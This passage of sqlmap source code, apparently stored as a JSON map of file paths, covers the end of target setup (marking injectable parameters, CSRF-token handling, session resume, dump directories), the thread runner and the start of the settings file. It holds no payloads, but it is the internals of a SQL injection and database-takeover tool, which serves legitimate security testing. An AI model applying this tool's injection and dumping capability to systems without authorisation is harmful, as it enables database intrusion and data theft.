\"\n                            warnMsg += \"so sqlmap could be able to run properly\"\n                            logger.warning(warnMsg)\n\n            if not kb.processUserMarks:\n                if place == PLACE.URI:\n                    query = _urllib.parse.urlsplit(value).query\n                    if query:\n                        parameters = conf.parameters[PLACE.GET] = query\n                        paramDict = paramToDict(PLACE.GET, parameters)\n\n                        if paramDict:\n                            conf.url = conf.url.split('?')[0]\n                            conf.paramDict[PLACE.GET] = paramDict\n                            testableParameters = True\n                elif place == PLACE.CUSTOM_POST:\n                    conf.parameters[PLACE.POST] = conf.data\n                    paramDict = paramToDict(PLACE.POST, conf.data)\n\n                    if paramDict:\n                        conf.paramDict[PLACE.POST] = paramDict\n                        testableParameters = True\n\n            else:\n                if place == PLACE.URI:\n                    value = conf.url = conf.url.replace('+', \"%20\")  # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5123\n\n                conf.parameters[place] = value\n                conf.paramDict[place] = OrderedDict()\n\n                if place == PLACE.CUSTOM_HEADER:\n                    for index in xrange(len(conf.httpHeaders)):\n                        header, value = conf.httpHeaders[index]\n                        if kb.customInjectionMark in re.sub(PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, \"\", value):\n                            parts = value.split(kb.customInjectionMark)\n                            for i in xrange(len(parts) - 1):\n                                conf.paramDict[place][\"%s #%d%s\" % (header, i + 1, kb.customInjectionMark)] = \"%s,%s\" % (header, \"\".join(\"%s%s\" % (parts[j], kb.customInjectionMark if i == j else \"\") for j in xrange(len(parts))))\n                            conf.httpHeaders[index] = (header, value.replace(kb.customInjectionMark, \"\"))\n                else:\n                    parts = value.split(kb.customInjectionMark)\n\n                    for i in xrange(len(parts) - 1):\n                        name = None\n                        if kb.postHint:\n                            for ending, _ in hintNames:\n                                if parts[i].endswith(ending):\n                                    name = \"%s %s\" % (kb.postHint, _)\n                                    break\n                        if name is None:\n                            name = \"%s#%s%s\" % ((\"%s \" % kb.postHint) if kb.postHint else \"\", i + 1, kb.customInjectionMark)\n                        conf.paramDict[place][name] = \"\".join(\"%s%s\" % (parts[j], kb.customInjectionMark if i == j else \"\") for j in xrange(len(parts)))\n\n                    if place == PLACE.URI and PLACE.GET in conf.paramDict:\n                        del conf.paramDict[PLACE.GET]\n                    elif place == PLACE.CUSTOM_POST and PLACE.POST in conf.paramDict:\n                        del conf.paramDict[PLACE.POST]\n\n                testableParameters = True\n\n    if kb.processUserMarks:\n        for item in (\"url\", \"data\", \"agent\", \"referer\", \"cookie\"):\n            if conf.get(item):\n                conf[item] = conf[item].replace(kb.customInjectionMark, \"\")\n\n    # Perform checks on Cookie parameters\n    if conf.cookie:\n        conf.parameters[PLACE.COOKIE] = conf.cookie\n        paramDict = paramToDict(PLACE.COOKIE, conf.cookie)\n\n        if paramDict:\n            conf.paramDict[PLACE.COOKIE] = paramDict\n            testableParameters = True\n\n    # Perform checks on header values\n    if conf.httpHeaders:\n        for httpHeader, headerValue in list(conf.httpHeaders):\n            # Url encoding of the header values should be avoided\n            # Reference: http://stackoverflow.com/questions/5085904/is-ok-to-urlencode-the-value-in-headerlocation-value\n\n            if httpHeader.upper() == HTTP_HEADER.USER_AGENT.upper():\n                conf.parameters[PLACE.USER_AGENT] = urldecode(headerValue)\n\n                condition = any((not conf.testParameter, intersect(conf.testParameter, USER_AGENT_ALIASES, True)))\n\n                if condition:\n                    conf.paramDict[PLACE.USER_AGENT] = {PLACE.USER_AGENT: headerValue}\n                    testableParameters = True\n\n            elif httpHeader.upper() == HTTP_HEADER.REFERER.upper():\n                conf.parameters[PLACE.REFERER] = urldecode(headerValue)\n\n                condition = any((not conf.testParameter, intersect(conf.testParameter, REFERER_ALIASES, True)))\n\n                if condition:\n                    conf.paramDict[PLACE.REFERER] = {PLACE.REFERER: headerValue}\n                    testableParameters = True\n\n            elif httpHeader.upper() == HTTP_HEADER.HOST.upper():\n                conf.parameters[PLACE.HOST] = urldecode(headerValue)\n\n                condition = any((not conf.testParameter, intersect(conf.testParameter, HOST_ALIASES, True)))\n\n                if condition:\n                    conf.paramDict[PLACE.HOST] = {PLACE.HOST: headerValue}\n                    testableParameters = True\n\n            else:\n                condition = intersect(conf.testParameter, [httpHeader], True)\n\n                if condition:\n                    conf.parameters[PLACE.CUSTOM_HEADER] = str(conf.httpHeaders)\n                    conf.paramDict[PLACE.CUSTOM_HEADER] = {httpHeader: \"%s,%s%s\" % (httpHeader, headerValue, kb.customInjectionMark)}\n                    conf.httpHeaders = [(_[0], _[1].replace(kb.customInjectionMark, \"\")) for _ in conf.httpHeaders]\n                    testableParameters = True\n\n    if not conf.parameters:\n        errMsg = \"you did not provide any GET, POST and Cookie \"\n        errMsg += \"parameter, neither an User-Agent, Referer or Host header value\"\n        raise SqlmapGenericException(errMsg)\n\n    elif not testableParameters:\n        errMsg = \"all testable parameters you provided are not present \"\n        errMsg += \"within the given request data\"\n        raise SqlmapGenericException(errMsg)\n\n    if conf.csrfToken:\n        if not any(re.search(conf.csrfToken, ' '.join(_), re.I) for _ in (conf.paramDict.get(PLACE.GET, {}), conf.paramDict.get(PLACE.POST, {}), conf.paramDict.get(PLACE.COOKIE, {}))) and not re.search(r\"\\b%s\\b\" % conf.csrfToken, conf.data or \"\") and conf.csrfToken not in set(_[0].lower() for _ in conf.httpHeaders) and conf.csrfToken not in conf.paramDict.get(PLACE.COOKIE, {}) and not all(re.search(conf.csrfToken, _, re.I) for _ in conf.paramDict.get(PLACE.URI, {}).values()):\n            errMsg = \"anti-CSRF token parameter '%s' not \" % conf.csrfToken._original\n            errMsg += \"found in provided GET, POST, Cookie or header values\"\n            raise SqlmapGenericException(errMsg)\n    else:\n        for place in (PLACE.GET, PLACE.POST, PLACE.COOKIE):\n            if conf.csrfToken:\n                break\n\n            for parameter in conf.paramDict.get(place, {}):\n                if any(parameter.lower().count(_) for _ in CSRF_TOKEN_PARAMETER_INFIXES):\n                    message = \"%sparameter '%s' appears to hold anti-CSRF token. \" % (\"%s \" % place if place != parameter else \"\", parameter)\n                    message += \"Do you want sqlmap to automatically update it in further requests? [y/N] \"\n\n                    if readInput(message, default='N', boolean=True):\n                        class _(six.text_type):\n                            pass\n                        conf.csrfToken = _(re.escape(getUnicode(parameter)))\n                        conf.csrfToken._original = getUnicode(parameter)\n                        break\n\ndef _setHashDB():\n    \"\"\"\n    Check and set the HashDB SQLite file for query resume functionality.\n    \"\"\"\n\n    if not conf.hashDBFile:\n        conf.hashDBFile = conf.sessionFile or os.path.join(conf.outputPath, SESSION_SQLITE_FILE)\n\n    if conf.flushSession:\n        if os.path.exists(conf.hashDBFile):\n            if conf.hashDB:\n                conf.hashDB.closeAll()\n\n            try:\n                os.remove(conf.hashDBFile)\n                logger.info(\"flushing session file\")\n            except OSError as ex:\n                errMsg = \"unable to flush the session file ('%s')\" % getSafeExString(ex)\n                raise SqlmapFilePathException(errMsg)\n\n    conf.hashDB = HashDB(conf.hashDBFile)\n\ndef _resumeHashDBValues():\n    \"\"\"\n    Resume stored data values from HashDB\n    \"\"\"\n\n    kb.absFilePaths = hashDBRetrieve(HASHDB_KEYS.KB_ABS_FILE_PATHS, True) or kb.absFilePaths\n    kb.brute.tables = hashDBRetrieve(HASHDB_KEYS.KB_BRUTE_TABLES, True) or kb.brute.tables\n    kb.brute.columns = hashDBRetrieve(HASHDB_KEYS.KB_BRUTE_COLUMNS, True) or kb.brute.columns\n    kb.chars = hashDBRetrieve(HASHDB_KEYS.KB_CHARS, True) or kb.chars\n    kb.dynamicMarkings = hashDBRetrieve(HASHDB_KEYS.KB_DYNAMIC_MARKINGS, True) or kb.dynamicMarkings\n    kb.xpCmdshellAvailable = hashDBRetrieve(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE) or kb.xpCmdshellAvailable\n\n    kb.errorChunkLength = hashDBRetrieve(HASHDB_KEYS.KB_ERROR_CHUNK_LENGTH)\n    if isNumPosStrValue(kb.errorChunkLength):\n        kb.errorChunkLength = int(kb.errorChunkLength)\n    else:\n        kb.errorChunkLength = None\n\n    conf.tmpPath = conf.tmpPath or hashDBRetrieve(HASHDB_KEYS.CONF_TMP_PATH)\n\n    for injection in hashDBRetrieve(HASHDB_KEYS.KB_INJECTIONS, True) or []:\n        if isinstance(injection, InjectionDict) and injection.place in conf.paramDict and injection.parameter in conf.paramDict[injection.place]:\n            if not conf.technique or intersect(conf.technique, injection.data.keys()):\n                if intersect(conf.technique, injection.data.keys()):\n                    injection.data = dict(_ for _ in injection.data.items() if _[0] in conf.technique)\n                if injection not in kb.injections:\n                    kb.injections.append(injection)\n                    kb.vulnHosts.add(conf.hostname)\n\n    _resumeDBMS()\n    _resumeOS()\n\ndef _resumeDBMS():\n    \"\"\"\n    Resume stored DBMS information from HashDB\n    \"\"\"\n\n    value = hashDBRetrieve(HASHDB_KEYS.DBMS)\n\n    if not value:\n        if conf.offline:\n            errMsg = \"unable to continue in offline mode \"\n            errMsg += \"because of lack of usable \"\n            errMsg += \"session data\"\n            raise SqlmapNoneDataException(errMsg)\n        else:\n            return\n\n    dbms = value.lower()\n    dbmsVersion = [UNKNOWN_DBMS_VERSION]\n    _ = \"(%s)\" % ('|'.join(SUPPORTED_DBMS))\n    _ = re.search(r\"\\A%s (.*)\" % _, dbms, re.I)\n\n    if _:\n        dbms = _.group(1).lower()\n        dbmsVersion = [_.group(2)]\n\n    if conf.dbms:\n        check = True\n        for aliases, _, _, _ in DBMS_DICT.values():\n            if conf.dbms.lower() in aliases and dbms not in aliases:\n                check = False\n                break\n\n        if not check:\n            message = \"you provided '%s' as a back-end DBMS, \" % conf.dbms\n            message += \"but from a past scan information on the target URL \"\n            message += \"sqlmap assumes the back-end DBMS is '%s'. \" % dbms\n            message += \"Do you really want to force the back-end \"\n            message += \"DBMS value? [y/N] \"\n\n            if not readInput(message, default='N', boolean=True):\n                conf.dbms = None\n                Backend.setDbms(dbms)\n                Backend.setVersionList(dbmsVersion)\n    else:\n        infoMsg = \"resuming back-end DBMS '%s' \" % dbms\n        logger.info(infoMsg)\n\n        Backend.setDbms(dbms)\n        Backend.setVersionList(dbmsVersion)\n\ndef _resumeOS():\n    \"\"\"\n    Resume stored OS information from HashDB\n    \"\"\"\n\n    value = hashDBRetrieve(HASHDB_KEYS.OS)\n\n    if not value:\n        return\n\n    os = value\n\n    if os and os != 'None':\n        infoMsg = \"resuming back-end DBMS operating system '%s' \" % os\n        logger.info(infoMsg)\n\n        if conf.os and conf.os.lower() != os.lower():\n            message = \"you provided '%s' as back-end DBMS operating \" % conf.os\n            message += \"system, but from a past scan information on the \"\n            message += \"target URL sqlmap assumes the back-end DBMS \"\n            message += \"operating system is %s. \" % os\n            message += \"Do you really want to force the back-end DBMS \"\n            message += \"OS value? [y/N] \"\n\n            if not readInput(message, default='N', boolean=True):\n                conf.os = os\n        else:\n            conf.os = os\n\n        Backend.setOs(conf.os)\n\ndef _setResultsFile():\n    \"\"\"\n    Create results file for storing results of running in a\n    multiple target mode.\n    \"\"\"\n\n    if not conf.multipleTargets:\n        return\n\n    if not conf.resultsFP:\n        conf.resultsFile = conf.resultsFile or os.path.join(paths.SQLMAP_OUTPUT_PATH, time.strftime(RESULTS_FILE_FORMAT).lower())\n        found = os.path.exists(conf.resultsFile)\n\n        try:\n            conf.resultsFP = openFile(conf.resultsFile, \"a\", UNICODE_ENCODING, buffering=0)\n        except (OSError, IOError) as ex:\n            try:\n                warnMsg = \"unable to create results file '%s' ('%s'). \" % (conf.resultsFile, getUnicode(ex))\n                handle, conf.resultsFile = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.RESULTS, suffix=\".csv\")\n                os.close(handle)\n                conf.resultsFP = openFile(conf.resultsFile, \"w+\", UNICODE_ENCODING, buffering=0)\n                warnMsg += \"Using temporary file '%s' instead\" % conf.resultsFile\n                logger.warning(warnMsg)\n            except IOError as _:\n                errMsg = \"unable to write to the temporary directory ('%s'). \" % _\n                errMsg += \"Please make sure that your disk is not full and \"\n                errMsg += \"that you have sufficient write permissions to \"\n                errMsg += \"create temporary files and/or directories\"\n                raise SqlmapSystemException(errMsg)\n\n        if not found:\n            conf.resultsFP.writelines(\"Target URL,Place,Parameter,Technique(s),Note(s)%s\" % os.linesep)\n\n        logger.info(\"using '%s' as the CSV results file in multiple targets mode\" % conf.resultsFile)\n\ndef _createFilesDir():\n    \"\"\"\n    Create the file directory.\n    \"\"\"\n\n    if not any((conf.fileRead, conf.commonFiles)):\n        return\n\n    conf.filePath = paths.SQLMAP_FILES_PATH % conf.hostname\n\n    if not os.path.isdir(conf.filePath):\n        try:\n            os.makedirs(conf.filePath)\n        except OSError as ex:\n            tempDir = tempfile.mkdtemp(prefix=\"sqlmapfiles\")\n            warnMsg = \"unable to create files directory \"\n            warnMsg += \"'%s' (%s). \" % (conf.filePath, getUnicode(ex))\n            warnMsg += \"Using temporary directory '%s' instead\" % getUnicode(tempDir)\n            logger.warning(warnMsg)\n\n            conf.filePath = tempDir\n\ndef _createDumpDir():\n    \"\"\"\n    Create the dump directory.\n    \"\"\"\n\n    if not conf.dumpTable and not conf.dumpAll and not conf.search:\n        return\n\n    conf.dumpPath = safeStringFormat(paths.SQLMAP_DUMP_PATH, conf.hostname)\n\n    if not os.path.isdir(conf.dumpPath):\n        try:\n            os.makedirs(conf.dumpPath)\n        except Exception as ex:\n            tempDir = tempfile.mkdtemp(prefix=\"sqlmapdump\")\n            warnMsg = \"unable to create dump directory \"\n            warnMsg += \"'%s' (%s). \" % (conf.dumpPath, getUnicode(ex))\n            warnMsg += \"Using temporary directory '%s' instead\" % getUnicode(tempDir)\n            logger.warning(warnMsg)\n\n            conf.dumpPath = tempDir\n\ndef _configureDumper():\n    conf.dumper = dumper\n    conf.dumper.setOutputFile()\n\ndef _createTargetDirs():\n    \"\"\"\n    Create the output directory.\n    \"\"\"\n\n    conf.outputPath = os.path.join(getUnicode(paths.SQLMAP_OUTPUT_PATH), normalizeUnicode(getUnicode(conf.hostname)))\n\n    try:\n        if not os.path.isdir(conf.outputPath):\n            os.makedirs(conf.outputPath)\n    except (OSError, IOError, TypeError) as ex:\n        tempDir = tempfile.mkdtemp(prefix=\"sqlmapoutput\")\n        warnMsg = \"unable to create output directory \"\n        warnMsg += \"'%s' (%s). \" % (conf.outputPath, getUnicode(ex))\n        warnMsg += \"Using temporary directory '%s' instead\" % getUnicode(tempDir)\n        logger.warning(warnMsg)\n\n        conf.outputPath = tempDir\n\n    conf.outputPath = getUnicode(conf.outputPath)\n\n    try:\n        with openFile(os.path.join(conf.outputPath, \"target.txt\"), \"w+\") as f:\n            f.write(getUnicode(kb.originalUrls.get(conf.url) or conf.url or conf.hostname))\n            f.write(\" (%s)\" % (HTTPMETHOD.POST if conf.data else HTTPMETHOD.GET))\n            f.write(\"  # %s\" % getUnicode(subprocess.list2cmdline(sys.argv), encoding=sys.stdin.encoding))\n            if conf.data:\n                f.write(\"\\n\\n%s\" % getUnicode(conf.data))\n    except IOError as ex:\n        if \"denied\" in getUnicode(ex):\n            errMsg = \"you don't have enough permissions \"\n        else:\n            errMsg = \"something went wrong while trying \"\n        errMsg += \"to write to the output directory '%s' (%s)\" % (paths.SQLMAP_OUTPUT_PATH, getSafeExString(ex))\n\n        raise SqlmapMissingPrivileges(errMsg)\n    except UnicodeError as ex:\n        warnMsg = \"something went wrong while saving target data ('%s')\" % getSafeExString(ex)\n        logger.warning(warnMsg)\n\n    _createDumpDir()\n    _createFilesDir()\n    _configureDumper()\n\ndef _setAuxOptions():\n    \"\"\"\n    Setup auxiliary (host-dependent) options\n    \"\"\"\n\n    kb.aliasName = randomStr(seed=hash(conf.hostname or \"\"))\n\ndef _restoreMergedOptions():\n    \"\"\"\n    Restore merged options (command line, configuration file and default values)\n    that could be possibly changed during the testing of previous target.\n    \"\"\"\n\n    for option in RESTORE_MERGED_OPTIONS:\n        conf[option] = mergedOptions[option]\n\ndef initTargetEnv():\n    \"\"\"\n    Initialize target environment.\n    \"\"\"\n\n    if conf.multipleTargets:\n        if conf.hashDB:\n            conf.hashDB.close()\n\n        if conf.cj:\n            resetCookieJar(conf.cj)\n\n        threadData = getCurrentThreadData()\n        threadData.reset()\n\n        conf.paramDict = {}\n        conf.parameters = {}\n        conf.hashDBFile = None\n\n        _setKnowledgeBaseAttributes(False)\n        _restoreMergedOptions()\n        _setDBMS()\n\n    if conf.data:\n        class _(six.text_type):\n            pass\n\n        kb.postUrlEncode = True\n\n        for key, value in conf.httpHeaders:\n            if key.upper() == HTTP_HEADER.CONTENT_TYPE.upper():\n                kb.postUrlEncode = \"urlencoded\" in value\n                break\n\n        if kb.postUrlEncode:\n            original = conf.data\n            conf.data = _(urldecode(conf.data))\n            setattr(conf.data, UNENCODED_ORIGINAL_VALUE, original)\n            kb.postSpaceToPlus = '+' in original\n\n    if conf.data and unArrayizeValue(conf.base64Parameter) == HTTPMETHOD.POST:\n        if '=' not in conf.data.strip('='):\n            try:\n                original = conf.data\n                conf.data = _(decodeBase64(conf.data, binary=False))\n                setattr(conf.data, UNENCODED_ORIGINAL_VALUE, original)\n            except:\n                pass\n\n    match = re.search(INJECT_HERE_REGEX, \"%s %s %s\" % (conf.url, conf.data, conf.httpHeaders))\n    kb.customInjectionMark = match.group(0) if match else CUSTOM_INJECTION_MARK_CHAR\n\ndef setupTargetEnv():\n    _createTargetDirs()\n    _setRequestParams()\n    _setHashDB()\n    _resumeHashDBValues()\n    _setResultsFile()\n    _setAuthCred()\n    _setAuxOptions()\n", "lib/core/threads.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport difflib\nimport sqlite3\nimport threading\nimport time\nimport traceback\n\nfrom lib.core.compat import WichmannHill\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.datatype import AttribDict\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapBaseException\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapSkipTargetException\nfrom lib.core.exception import SqlmapThreadException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.exception import SqlmapValueException\nfrom lib.core.settings import MAX_NUMBER_OF_THREADS\nfrom lib.core.settings import PYVERSION\n\nshared = AttribDict()\n\nclass _ThreadData(threading.local):\n    \"\"\"\n    Represents thread independent data\n    \"\"\"\n\n    def __init__(self):\n        self.reset()\n\n    def reset(self):\n        \"\"\"\n        Resets thread data model\n        \"\"\"\n\n        self.disableStdOut = False\n        self.hashDBCursor = None\n        self.inTransaction = False\n        self.lastCode = None\n        self.lastComparisonPage = None\n        self.lastComparisonHeaders = None\n        self.lastComparisonCode = None\n        self.lastComparisonRatio = None\n        self.lastErrorPage = tuple()\n        self.lastHTTPError = None\n        self.lastRedirectMsg = None\n        self.lastQueryDuration = 0\n        self.lastPage = None\n        self.lastRequestMsg = None\n        self.lastRequestUID = 0\n        self.lastRedirectURL = tuple()\n        self.random = WichmannHill()\n        self.resumed = False\n        self.retriesCount = 0\n        self.seqMatcher = difflib.SequenceMatcher(None)\n        self.shared = shared\n        self.technique = None\n        self.validationRun = 0\n        self.valueStack = []\n\nThreadData = _ThreadData()\n\ndef readInput(message, default=None, checkBatch=True, boolean=False):\n    # It will be overwritten by original from lib.core.common\n    pass\n\ndef isDigit(value):\n    # It will be overwritten by original from lib.core.common\n    pass\n\ndef getCurrentThreadData():\n    \"\"\"\n    Returns current thread's local data\n    \"\"\"\n\n    return ThreadData\n\ndef getCurrentThreadName():\n    \"\"\"\n    Returns current's thread name\n    \"\"\"\n\n    return threading.current_thread().getName()\n\ndef exceptionHandledFunction(threadFunction, silent=False):\n    try:\n        threadFunction()\n    except KeyboardInterrupt:\n        kb.threadContinue = False\n        kb.threadException = True\n        raise\n    except Exception as ex:\n        from lib.core.common import getSafeExString\n\n        if not silent and kb.get(\"threadContinue\") and not kb.get(\"multipleCtrlC\") and not isinstance(ex, (SqlmapUserQuitException, SqlmapSkipTargetException)):\n            errMsg = getSafeExString(ex) if isinstance(ex, SqlmapBaseException) else \"%s: %s\" % (type(ex).__name__, getSafeExString(ex))\n            logger.error(\"thread %s: '%s'\" % (threading.currentThread().getName(), errMsg))\n\n            if conf.get(\"verbose\") > 1 and not isinstance(ex, SqlmapConnectionException):\n                traceback.print_exc()\n\ndef setDaemon(thread):\n    # Reference: http://stackoverflow.com/questions/190010/daemon-threads-explanation\n    if PYVERSION >= \"2.6\":\n        thread.daemon = True\n    else:\n        thread.setDaemon(True)\n\ndef runThreads(numThreads, threadFunction, cleanupFunction=None, forwardException=True, threadChoice=False, startThreadMsg=True):\n    threads = []\n\n    def _threadFunction():\n        try:\n            threadFunction()\n        finally:\n            if conf.hashDB:\n                conf.hashDB.close()\n\n    kb.multipleCtrlC = False\n    kb.threadContinue = True\n    kb.threadException = False\n    kb.technique = ThreadData.technique\n    kb.multiThreadMode = False\n\n    try:\n        if threadChoice and conf.threads == numThreads == 1 and not (kb.injection.data and not any(_ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED) for _ in kb.injection.data)):\n            while True:\n                message = \"please enter number of threads? [Enter for %d (current)] \" % numThreads\n                choice = readInput(message, default=str(numThreads))\n                if choice:\n                    skipThreadCheck = False\n\n                    if choice.endswith('!'):\n                        choice = choice[:-1]\n                        skipThreadCheck = True\n\n                    if isDigit(choice):\n                        if int(choice) > MAX_NUMBER_OF_THREADS and not skipThreadCheck:\n                            errMsg = \"maximum number of used threads is %d avoiding potential connection issues\" % MAX_NUMBER_OF_THREADS\n                            logger.critical(errMsg)\n                        else:\n                            conf.threads = numThreads = int(choice)\n                            break\n\n            if numThreads == 1:\n                warnMsg = \"running in a single-thread mode. This could take a while\"\n                logger.warning(warnMsg)\n\n        if numThreads > 1:\n            if startThreadMsg:\n                infoMsg = \"starting %d threads\" % numThreads\n                logger.info(infoMsg)\n        else:\n            try:\n                _threadFunction()\n            except (SqlmapUserQuitException, SqlmapSkipTargetException):\n                pass\n            finally:\n                return\n\n        kb.multiThreadMode = True\n\n        # Start the threads\n        for numThread in xrange(numThreads):\n            thread = threading.Thread(target=exceptionHandledFunction, name=str(numThread), args=[_threadFunction])\n\n            setDaemon(thread)\n\n            try:\n                thread.start()\n            except Exception as ex:\n                errMsg = \"error occurred while starting new thread ('%s')\" % ex\n                logger.critical(errMsg)\n                break\n\n            threads.append(thread)\n\n        # And wait for them to all finish\n        alive = True\n        while alive:\n            alive = False\n            for thread in threads:\n                if thread.is_alive():\n                    alive = True\n                    time.sleep(0.1)\n\n    except (KeyboardInterrupt, SqlmapUserQuitException) as ex:\n        print()\n        kb.prependFlag = False\n        kb.threadContinue = False\n        kb.threadException = True\n\n        if kb.lastCtrlCTime and (time.time() - kb.lastCtrlCTime < 1):\n            kb.multipleCtrlC = True\n            raise SqlmapUserQuitException(\"user aborted (Ctrl+C was pressed multiple times)\")\n\n        kb.lastCtrlCTime = time.time()\n\n        if numThreads > 1:\n            logger.info(\"waiting for threads to finish%s\" % (\" (Ctrl+C was pressed)\" if isinstance(ex, KeyboardInterrupt) else \"\"))\n        try:\n            while (threading.active_count() > 1):\n                pass\n\n        except KeyboardInterrupt:\n            kb.multipleCtrlC = True\n            raise SqlmapThreadException(\"user aborted (Ctrl+C was pressed multiple times)\")\n\n        if forwardException:\n            raise\n\n    except (SqlmapConnectionException, SqlmapValueException) as ex:\n        print()\n        kb.threadException = True\n        logger.error(\"thread %s: '%s'\" % (threading.currentThread().getName(), ex))\n\n        if conf.get(\"verbose\") > 1 and isinstance(ex, SqlmapValueException):\n            traceback.print_exc()\n\n    except Exception as ex:\n        print()\n\n        if not kb.multipleCtrlC:\n            if isinstance(ex, sqlite3.Error):\n                raise\n            else:\n                from lib.core.common import unhandledExceptionMessage\n\n                kb.threadException = True\n                errMsg = unhandledExceptionMessage()\n                logger.error(\"thread %s: %s\" % (threading.currentThread().getName(), errMsg))\n                traceback.print_exc()\n\n    finally:\n        kb.multiThreadMode = False\n        kb.threadContinue = True\n        kb.threadException = False\n        kb.technique = None\n\n        for lock in kb.locks.values():\n            if lock.locked():\n                try:\n                    lock.release()\n                except:\n                    pass\n\n        if conf.get(\"hashDB\"):\n            conf.hashDB.flush(True)\n\n        if cleanupFunction:\n            cleanupFunction()\n", "lib/core/settings.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport codecs\nimport os\nimport random\nimport re\nimport string\nimport sys\nimport time\n\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import DBMS_DIRECTORY_NAME\nfrom lib.core.enums import OS\nfrom thirdparty import six\n\n# sqlmap version (<major>.<minor>.<month>.<monthly commit>)\nVERSION = \"1.8.6.11\"\nTYPE = \"dev\" if VERSION.count('.') > 2 and VERSION.split('.')[-1] != '0' else \"stable\"\nTYPE_COLORS = {\"dev\": 33, \"stable\": 90, \"pip\": 34}\nVERSION_STRING = \"sqlmap/%s#%s\" % ('.'.join(VERSION.split('.')[:-1]) if VERSION.count('.') > 2 and VERSION.split('.')[-1] == '0' else VERSION, TYPE)\nDESCRIPTION = \"automatic SQL injection and database takeover tool\"\nSITE = \"https://sqlmap.org\"\nDEFAULT_USER_AGENT = \"%s (%s)\" % (VERSION_STRING, SITE)\nDEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  \\033[01;37m{\\033[01;%dm%s\\033[01;37m}\\033[01;33m\n|_ -| . [.]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   \\033[0m\\033[4;37m%s\\033[0m\\n\n\"\"\" % (TYPE_COLORS.get(TYPE, 31), VERSION_STRING.split('/')[-1], SITE)\n\n# Minimum distance of ratio from kb.matchRatio to result in True\nDIFF_TOLERANCE = 0.05\nCONSTANT_RATIO = 0.9\n\n# Ratio used in heuristic check for WAF/IPS protected targets\nIPS_WAF_CHECK_RATIO = 0.5\n\n# Timeout used in heuristic check for WAF/IPS protected targets\nIPS_WAF_CHECK_TIMEOUT = 10\n\n# Timeout used in checking for existence of live-cookies file\nLIVE_COOKIES_TIMEOUT = 120\n\n# Lower and upper values for match ratio in case of stable page\nLOWER_RATIO_BOUND = 0.02\nUPPER_RATIO_BOUND = 0.98\n\n# Markers for special cases when parameter values contain html encoded characters\nPARAMETER_AMP_MARKER = \"__AMP__\"\nPARAMETER_SEMICOLON_MARKER = \"__SEMICOLON__\"\nBOUNDARY_BACKSLASH_MARKER = \"__BACKSLASH__\"\nPARAMETER_PERCENTAGE_MARKER = \"__PERCENTAGE__\"\nPARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"\nPARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\n\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\n\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n\n# Regular expression used for recognition of textual content-type\nTEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"\n\n# Regular expression used for recognition of generic permission messages\nPERMISSION_DENIED_REGEX = r\"(?P<result>(command|permission|access)\\s*(was|is)?\\s*denied)\"\n\n# Regular expression used in recognition of generic protection mechanisms\nGENERIC_PROTECTION_REGEX = r\"(?i)\\b(rejected|blocked|protection|incident|denied|detected|dangerous|firewall)\\b\"\n\n# Regular expression used to detect errors in fuzz(y) UNION test\nFUZZ_UNION_ERROR_REGEX = r\"(?i)data\\s?type|comparable|compatible|conversion|converting|failed|error\"\n\n# Upper threshold for starting the fuzz(y) UNION test\nFUZZ_UNION_MAX_COLUMNS = 10\n\n# Regular expression used for recognition of generic maximum connection messages\nMAX_CONNECTIONS_REGEX = r\"\\bmax.{1,100}\\bconnection\"\n\n# Maximum consecutive connection errors before asking the user if he wants to continue\nMAX_CONSECUTIVE_CONNECTION_ERRORS = 15\n\n# Timeout before the pre-connection candidate is being 